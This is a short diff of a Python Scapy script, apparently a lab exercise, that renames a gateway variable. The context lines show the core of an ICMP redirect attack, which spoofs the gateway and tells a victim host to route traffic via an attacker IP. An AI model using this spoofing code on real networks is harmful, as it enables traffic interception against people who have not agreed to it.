@@ -4,7 +4,7 @@ import time
 
 # define the IP addresses and network interface
 victim_ip = "10.0.2.4"
-trusted_gateway_ip = "10.0.2.1"
+default_gateway_ip = "10.0.2.1"
 attacker_ip = "10.0.2.6"
 iface = "enp0s3"  # replace with your network interface name
 
@@ -17,7 +17,7 @@ def send_icmp_redirect(pkt):
             # the crafted packet contains its own IP header,
             # its own ICMP header, and the original IP packet
             # which we captured.
-            icmp_redirect = IP(src=trusted_gateway_ip, dst=victim_ip) / \
+            icmp_redirect = IP(src=default_gateway_ip, dst=victim_ip) / \
                             ICMP(type=5, code=1, gw=attacker_ip) / \
                             IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                             pkt[IP].payload
